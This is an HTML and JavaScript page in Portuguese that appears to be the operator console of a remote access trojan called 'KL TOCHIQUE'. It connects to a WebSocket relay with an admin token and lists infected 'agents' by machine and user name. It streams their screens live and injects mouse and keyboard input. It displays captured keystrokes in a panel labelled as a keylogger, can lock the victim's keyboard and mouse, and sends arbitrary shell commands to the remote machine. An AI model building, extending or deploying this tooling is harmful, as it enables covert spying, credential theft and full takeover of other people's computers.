<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>KL TOCHIQUE</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap');
:root{--bg:#050807;--panel:rgba(9,15,12,.88);--panel-2:rgba(12,22,17,.78);--line:rgba(84,255,160,.15);--line-strong:rgba(84,255,160,.28);--green:#54ffa0;--green-2:#2ee67c;--text:#e7fff0;--muted:#7f9a89;--danger:#ff4d6d;--warn:#ffcf5a;--shadow:0 20px 80px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.02);}
body,html{height:100%;margin:0;padding:0;}
body{font-family:Inter,sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden;}
body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,rgba(255,255,255,.012) 0,rgba(255,255,255,.012) 1px,transparent 1px,transparent 3px);mix-blend-mode:soft-light;}
.wrap{max-width:1500px;margin:0 auto;padding:28px 22px 60px}
.wrap>h1{margin:0 0 18px;font-family:'IBM Plex Mono',monospace;font-size:clamp(24px,3vw,38px);letter-spacing:-1px;font-weight:700;display:flex;align-items:center;gap:12px;}
.wrap>h1::before{content:"//";color:var(--green);text-shadow:0 0 20px rgba(84,255,160,.55);}
.top,.card,.viewer{background:linear-gradient(180deg,rgba(11,18,14,.96),rgba(6,10,8,.96));border:1px solid var(--line);border-radius:14px;box-shadow:var(--shadow);backdrop-filter:blur(16px);}
.top{padding:14px;margin-bottom:14px;position:relative;overflow:hidden}
.row{display:flex;gap:9px;align-items:center;flex-wrap:wrap}
input,select{color:var(--text);background:#07100b;border:1px solid var(--line-strong);border-radius:9px;padding:11px 12px;min-width:240px;outline:none;font-family:'IBM Plex Mono',monospace;transition:.2s ease;}
button{padding:10px 14px;border:1px solid var(--line-strong);background:linear-gradient(180deg,#0c1710,#08100b);color:#cffff0;border-radius:8px;cursor:pointer;font-family:'IBM Plex Mono',monospace;font-weight:600;transition:.18s ease;}
button:hover{border-color:var(--green);color:#fff;}
#connectBtn,#applyProfile{background:linear-gradient(180deg,#163522,#0f2418);border-color:rgba(84,255,160,.48);color:var(--green)}
.status{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:13px}
.ok{color:var(--green)}.bad{color:var(--danger)}.wait{color:var(--warn)}
#agents{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:12px;margin-bottom:14px}
.card{padding:16px;margin:0;position:relative;overflow:hidden;border:1px solid var(--line);border-radius:14px;}
.agent-title{font:700 16px 'IBM Plex Mono',monospace;color:#effff5;margin-bottom:6px}
.small{color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace}
.badge{display:inline-block;padding:3px 7px;border:1px solid var(--line);border-radius:999px;background:#0b1710;font-size:11px;color:var(--green)}
.viewer{padding:16px;position:relative;overflow:hidden}
.toolbar{margin-bottom:12px;padding:10px;border:1px solid rgba(84,255,160,.09);border-radius:10px;background:rgba(255,255,255,.012)}
.control-banner{margin:10px 0;padding:11px 12px;border-radius:9px;background:rgba(255,77,109,.08);border:1px solid rgba(255,77,109,.25);color:#ff8ba0;font:700 12px 'IBM Plex Mono',monospace;display:none}
.screen-wrap{position:relative;background:#010302;border:1px solid rgba(84,255,160,.2);border-radius:12px;overflow:hidden;display:flex;justify-content:center;align-items:center;min-height:460px;box-shadow:inset 0 0 40px rgba(0,0,0,.7);cursor: crosshair;}
canvas{display:block;max-width:100%;height:auto;outline:none;}
.metrics{margin-top:10px;display:grid;grid-template-columns:repeat(4,minmax(120px,1fr));gap:8px}
.metrics span{padding:9px 10px;background:#07100b;border:1px solid rgba(84,255,160,.1);border-radius:8px;color:#9bb8a5;font:500 11px 'IBM Plex Mono',monospace}
.advanced-section{margin-top:16px;padding-top:16px;border-top:1px solid var(--line)}
.terminal-box{background:#020503;color:var(--green);padding:13px;border:1px solid rgba(84,255,160,.18);border-radius:9px;font-family:'IBM Plex Mono',monospace;min-height:120px;max-height:230px;overflow-y:auto;font-size:12px;margin-top:9px;white-space:pre-wrap;}
.keylog-container{min-height:150px;max-height:300px;overflow-y:auto;margin-top:18px;padding:14px;border:1px solid rgba(84,255,160,.1);border-radius:10px;background:rgba(2,5,3,.7)}
.log-entry{font-family:'IBM Plex Mono',monospace;font-size:12px;padding:7px 5px;border-bottom:1px solid rgba(84,255,160,.07);color:#b8cbbf}
.log-time{color:#51665a;margin-right:8px;font-size:11px}.log-key{font-weight:700;color:var(--green)}.log-down{color:#7bffb2;font-weight:700}.log-up{color:#ff7189}
</style>
</head>
<body id="body">
<div class="wrap">
    <h1 id="mainTitle">KL TOCHIQUE</h1>
    <div class="top">
        <div class="row">
            <input id="wsUrl" placeholder="wss://seu-realtime.up.railway.app">
            <input id="token" type="password" placeholder="ADMIN_TOKEN">
            <button id="connectBtn">Conectar</button>
            <span id="connStatus" class="status"></span>
        </div>
    </div>
    <div id="agents"></div>
    <div class="viewer">
        <h2 id="viewTitle">Tela ao vivo</h2>
        <div class="toolbar row">
            <label>Perfil:</label>
            <select id="profile">
                <option value="fluid">Fluido — 1280px / 30 FPS</option>
                <option value="balanced" selected>Equilibrado — 1600px / 25 FPS</option>
                <option value="quality">Qualidade — 1920px / 20 FPS</option>
            </select>
            <button id="applyProfile">Aplicar perfil</button>
            <button id="fullBtn">Tela cheia</button>
        </div>
        <div id="controlBanner" class="control-banner">🔴 Controle remoto ativo</div>
        <div class="screen-wrap" id="screenWrap">
            <canvas id="screen" tabindex="0"></canvas>
        </div>
        <div class="metrics">
            <span id="fps">FPS: 0</span>
            <span id="bitrate">Recebimento: 0 Mbps</span>
            <span id="frames">Frames: 0</span>
            <span id="drops">Drops: 0</span>
        </div>
        <div id="advancedControls" class="advanced-section" style="display:none;">
            <h3 style="font-family:'IBM Plex Mono';">Controle de Sistema</h3>
            <div class="row">
                <button id="btnLockInput" class="lock-btn">🔒 Bloquear Teclado/Mouse</button>
                <button id="btnUnlockInput" style="display:none;">🔓 Desbloquear</button>
                <span id="lockStatus" class="small">Status: Desbloqueado</span>
            </div>
            <div class="shell-section">
                <h4 style="margin-bottom:5px; font-family:'IBM Plex Mono';">Terminal Remoto (Shell)</h4>
                <div class="shell-input-group" style="display:flex; gap:7px; margin-top:10px;">
                    <input id="shellCommand" placeholder="Comando...">
                    <button id="btnExecuteShell">Enviar</button>
                </div>
                <div id="shellOutput" class="terminal-box">Aguardando comando...</div>
            </div>
        </div>
        <div class="keylog-container" id="keylogContainer">
            <h3 style="margin-top:0; font-family:'IBM Plex Mono';">Console de Eventos (Keylogger)</h3>
            <div id="keylogList"></div>
        </div>
    </div>
</div>

<script>
const wsUrlEl=document.getElementById('wsUrl'),tokenEl=document.getElementById('token'),connectBtn=document.getElementById('connectBtn'),connStatus=document.getElementById('connStatus'),agentsEl=document.getElementById('agents'),canvas=document.getElementById('screen'),ctx=canvas.getContext('2d',{alpha:false}),fpsEl=document.getElementById('fps'),bitrateEl=document.getElementById('bitrate'),framesEl=document.getElementById('frames'),dropsEl=document.getElementById('drops'),profileEl=document.getElementById('profile'),applyProfile=document.getElementById('applyProfile'),controlBanner=document.getElementById('controlBanner'),screenWrap=document.getElementById('screenWrap'),keylogList=document.getElementById('keylogList'),advancedControls=document.getElementById('advancedControls'),btnLockInput=document.getElementById('btnLockInput'),btnUnlockInput=document.getElementById('btnUnlockInput'),lockStatusText=document.getElementById('lockStatus'),shellCommandInput=document.getElementById('shellCommand'),btnExecuteShell=document.getElementById('btnExecuteShell'),shellOutput=document.getElementById('shellOutput');

let ws=null,agents=[],selectedAgentId=null,frames=0,fpsFrames=0,lastFps=performance.now(),bytesSecond=0,dropped=0,decoding=false,pendingFrame=null;

function connect() {
    const url = wsUrlEl.value.trim(), token = tokenEl.value;
    localStorage.setItem('em_ws', url); localStorage.setItem('em_admin', token);
    if(!url) return alert("URL necessária!");
    try { ws = new WebSocket(url); ws.binaryType = 'arraybuffer'; } 
    catch(e) { alert("Erro ao abrir WebSocket"); return; }
    ws.onopen = () => { setStatus('Conectado', 'ok'); send({ type: 'admin_hello', token: token }); };
    ws.onmessage = async (ev) => {
        if (typeof ev.data === 'string') {
            let m; try { m = JSON.parse(ev.data); } catch { return; }
            handleMessage(m);
        } else { renderFrame(ev.data); }
    };
    ws.onclose = () => setStatus('Desconectado', 'bad');
    ws.onerror = () => setStatus('Erro de Conexão', 'bad');
}

function setStatus(t,c=''){ connStatus.textContent=t; connStatus.className='status '+c; }
function send(o){ if(ws?.readyState===WebSocket.OPEN) ws.send(JSON.stringify(o)); }

function handleMessage(m) {
    switch(m.type) {
        case 'agent_list': agents = m.agents || []; renderAgents(agents); break;
        case 'metrics': updateMetrics(m); break;
        case 'keylog': addKeylogEntry(m.key, m.down, m.ts); break;
        case 'shell_result': shellOutput.textContent += `\n[RES]: ${m.output}\n`; break;
        case 'lock_ack': updateLockUI(m.status); break;
    }
}

function renderFrame(buf) {
    if (decoding) { pendingFrame = buf; dropped++; return; }
    decoding = true;
    const blob = new Blob([buf], { type: 'image/jpeg' });
    const url = URL.createObjectURL(blob);
    const img = new Image();
    img.onload = () => {
        if (canvas.width !== img.width || canvas.height !== img.height) {
            canvas.width = img.width; canvas.height = img.height;
        }
        ctx.drawImage(img, 0, 0);
        URL.revokeObjectURL(url);
        decoding = false;
        frames++; fpsFrames++;
        if (pendingFrame) { const next = pendingFrame; pendingFrame = null; renderFrame(next); }
    };
    img.src = url;
}

function updateMetrics(m) {
    document.getElementById('fps').textContent = m.fps || 0;
    document.getElementById('bitrate').textContent = (m.bitrate / 1000000).toFixed(2);
    document.getElementById('drops').textContent = m.drops || 0;
}

function updateLockUI(status) {
    btnLockInput.style.display = status ? 'none' : 'inline-block';
    btnUnlockInput.style.display = status ? 'inline-block' : 'none';
    lockStatusText.textContent = status ? 'Status: BLOQUEADO' : 'Status: Desbloqueado';
}

// --- CONTINUAÇÃO DA FUNÇÃO addKeylogEntry ---
function addKeylogEntry(key, down, ts) {
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    const statusClass = down ? 'log-down' : 'log-up';
    const statusText = down ? 'PRESSIONADA' : 'SOLTA';
    entry.innerHTML = `<span class="log-time">[${ts}]</span> <span class="log-key">${key}</span> <span class="${statusClass}">${statusText}</span>`;
    keylogList.prepend(entry);
    if (keylogList.childNodes.length > 50) keylogList.lastChild.remove();
}

// --- CONTROLE REMOTO (MOUSE E TECLADO) ---
function selectAgent(id) {
    selectedAgentId = id;
    controlBanner.style.display = 'block';
    advancedControls.style.display = 'block';
    send({ type: 'request_control', agentId: id });
}

function sendControl(data) {
    if (selectedAgentId) send({ type: 'control_input', agentId: selectedAgentId, ...data });
}

// Mouse
canvas.addEventListener('mousedown', (e) => handleMouseEvent(e, true));
canvas.addEventListener('mouseup', (e) => handleMouseEvent(e, false));
canvas.addEventListener('mousemove', (e) => {
    if (e.buttons > 0) handleMouseEvent(e, true, true);
});

function handleMouseEvent(e, isDown, isMove = false) {
    if (!selectedAgentId) return;
    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;

    if (isMove) {
        sendControl({ kind: 'move', x, y });
    } else {
        let button = e.button === 2 ? 'right' : (e.button === 1 ? 'middle' : 'left');
        sendControl({ kind: 'mouse', button, down: isDown, x, y });
    }
}

// Teclado
canvas.addEventListener('keydown', (e) => {
    if (['F5', 'Tab'].includes(e.code)) e.preventDefault();
    sendControl({ kind: 'key', code: e.code, down: true });
});

canvas.addEventListener('keyup', (e) => {
    sendControl({ kind: 'key', code: e.code, down: false });
});

canvas.addEventListener('contextmenu', e => e.preventDefault());

// --- UI E AGENTES ---
function renderAgents(agents) {
    agentsEl.innerHTML = '';
    agents.forEach(agent => {
        const div = document.createElement('div');
        div.className = 'card';
        div.innerHTML = `
            <div class="agent-title">${agent.name}</div>
            <div class="small">${agent.user}</div>
            <div class="small" style="margin-top:5px; color:var(--green)">${agent.id}</div>
            <div style="margin-top:10px;">
                <button onclick="selectAgent('${agent.id}')">Conectar e Controlar</button>
            </div>
        `;
        agentsEl.appendChild(div);
    });
}

// Bloqueio de Input
document.getElementById('btnLockInput').onclick = () => sendControl({ type: 'input_lock', active: true });
document.getElementById('btnUnlockInput').onclick = () => sendControl({ type: 'input_lock', active: false });

// Shell
document.getElementById('btnExecuteShell').onclick = () => {
    const cmd = shellCommandInput.value.trim();
    if (cmd && selectedAgentId) {
        shellOutput.textContent += `\n> ${cmd}\n`;
        send({ type: 'shell_cmd', agentId: selectedAgentId, cmd: cmd });
        shellCommandInput.value = '';
    }
};

// Inicialização
connectBtn.addEventListener('click', connect);
applyProfile.onclick = () => {
    const p = profileEl.value;
    localStorage.setItem('em_profile', p);
    send({ type: 'set_profile', agentId: selectedAgentId, profile: p });
};
document.getElementById('fullBtn').onclick = () => canvas.requestFullscreen?.();

// --- FINALIZAÇÃO ---

// --- FIM DO SCRIPT ---
</script>
</body>
</html>
